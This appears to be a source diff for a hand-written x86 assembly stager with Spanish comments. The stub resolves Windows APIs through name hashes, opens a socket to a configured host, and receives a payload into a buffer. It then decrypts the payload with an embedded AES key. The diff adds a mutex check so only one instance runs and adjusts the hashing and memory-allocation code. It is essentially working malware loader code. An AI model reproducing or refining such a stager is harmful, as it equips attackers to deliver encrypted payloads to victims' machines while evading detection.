@@ -11,25 +11,11 @@
 
 void LoadFunctions(DWORD numHashes);
 
-/*###############################################################################
-** Identificadores para APIs y variables:
-**    Éstos son luego utilizados para acceder a la correcta posición
-**    en el stack de direcciones.
-**    Para más información revisar 'macros.h'.
-*###############################################################################*/
-CREATE_IDS(
-            /*kernel32*/    (LoadLibraryA) (GetProcAddress) (Sleep) (ExitProcess) (GlobalAlloc)
-            /*ws2_32*/      (WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
-			/*advapi32*/	(CryptAcquireContextA) (CryptSetKeyParam) (CryptImportKey) (CryptDecrypt)
-            /*variables*/   (hSocket) (pBuff) (buffLen) (hProv) (hHash) (hKey)
-           )
-
 void __declspec(naked) main(){
     __asm{
         //Pasamos inicio real del código saltando sobre las constantes.
         jmp  start
 
-#pragma region constants
         /*###############################################################################
         ** Constantes:
         **    Aquí se declaran las constantes utilizadas en el código{
@@ -50,34 +36,52 @@ KEY:   	//typedef struct aes128Blob{
             /*keySize*/         EMIT_DWORD(0x10)
             /*keydata[16]*/     EMIT_BYTE_ARRAY( (0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04) )	
         //}
-
+        }
+#pragma region hashes
 kernel32_symbol_hashes:
+        #ifdef MUTEX
+        #define kernel32_count  6
+        #else
         #define kernel32_count  5
-        /*LoadLibraryA*/        HASH_AND_EMIT( ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A') )
-        /*GetProcAddress*/      HASH_AND_EMIT( ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
-        /*Sleep*/               HASH_AND_EMIT( ('S') ('l') ('e') ('e') ('p') )
-        /*ExitProcess*/         HASH_AND_EMIT( ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
-        /*GlobalAlloc*/         HASH_AND_EMIT( ('G') ('l') ('o') ('b') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
-
+        #endif
+        API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A') )
+        API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
+        API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p') )
+        API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
+        API_DEFINE(LocalAlloc, ('L') ('o') ('c') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
+        #ifdef MUTEX
+        API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A') )
+        #endif
 ws2_32_symbol_hashes:
         #define ws2_32_count    8
-        /*WSASocketA*/          HASH_AND_EMIT( ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A') )
-        /*connect*/             HASH_AND_EMIT( ('c') ('o') ('n') ('n') ('e') ('c') ('t') )
-        /*WSAStartup*/          HASH_AND_EMIT( ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p') )
-        /*closesocket*/         HASH_AND_EMIT( ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t') )
-        /*send*/                HASH_AND_EMIT( ('s') ('e') ('n') ('d') )
-        /*inet_addr*/           HASH_AND_EMIT( ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r') )
-        /*gethostbyname*/       HASH_AND_EMIT( ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e') )
-        /*recv*/                HASH_AND_EMIT( ('r') ('e') ('c') ('v') )
+        API_DEFINE(WSASocketA, ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A') )
+        API_DEFINE(connect, ('c') ('o') ('n') ('n') ('e') ('c') ('t') )
+        API_DEFINE(WSAStartup, ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p') )
+        API_DEFINE(closesocket, ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t') )
+        API_DEFINE(send, ('s') ('e') ('n') ('d') )
+        API_DEFINE(inet_addr, ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r') )
+        API_DEFINE(gethostbyname, ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e') )
+        API_DEFINE(recv, ('r') ('e') ('c') ('v') )
 
 advapi32_symbol_hashes:
         #define advapi32_count	4
-        /*CryptAcquireContextA*/HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A') )
-        /*CryptSetKeyParam*/    HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m') )
-        /*CryptImportKey*/      HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y') )
-        /*CryptDecrypt*/        HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )
+        API_DEFINE(CryptAcquireContextA, ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A') )
+        API_DEFINE(CryptSetKeyParam, ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m') )
+        API_DEFINE(CryptImportKey, ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y') )
+        API_DEFINE(CryptDecrypt, ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )
+
 #pragma endregion
 
+#pragma region VARS
+        VAR_DEFINE(hProv)
+        VAR_DEFINE(hKey)
+        VAR_DEFINE(hSocket)
+        VAR_DEFINE(pBuff)
+        VAR_DEFINE(buffLen)
+#pragma endregion
+        CALC_STACKSIZE()
+
+__asm{
 #ifdef ERR_CHECK
 /*###############################################################################
 ** gtfo:
@@ -194,11 +198,32 @@ find_kernel32_finished:
         //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4
 
+        #ifdef MUTEX
+        pushr(HOST)                     //v
+        cdq                             //EDX = 0
+        push edx                        //v
+        push edx                        //v
+        call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &HOST)
+        cdq                             //EDX = 0
+        mov  eax, DWORD PTR FS:[edx + 0x18]//v
+        mov  eax, [eax+0x34]            //> GetLastError()
+        #ifdef ERR_CHECK
+        xor  al, 0xB7
+        push ERR_MTX
+        call gtfo
+        #else
+        test eax, eax
+        jz  nomtx
+        call [ebp+_ExitProcess]
+nomtx:
+        #endif
+        #endif
+
         //Creamos el buffer donde recibiremos toda la información
         #define BUFF_SIZE   0x10000
         pushc(BUFF_SIZE)                //v
         push GPTR                       //v
-        call [ebp+_GlobalAlloc]         //>GlobalAlloc(GPTR, BUFF_SIZE)
+        call [ebp+_LocalAlloc]          //>LocalAlloc(GPTR, BUFF_SIZE)
         #ifdef ERR_CHECK
         push ERR_MEM                    //v
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
@@ -463,7 +488,6 @@ compute_hash_again:
         lodsb                           //AL = BYTE[ESI];ESI++
         test al, al                     //v
         jz   compute_hash_finished      //>(AL==0)? Fin del LibName
-        shr  ebx, 1                     //hash>>=1
         imul eax, al                    //v
         xor  ebx, eax                   //>hash ^= (char[i]*char[i])
         jmp  compute_hash_again
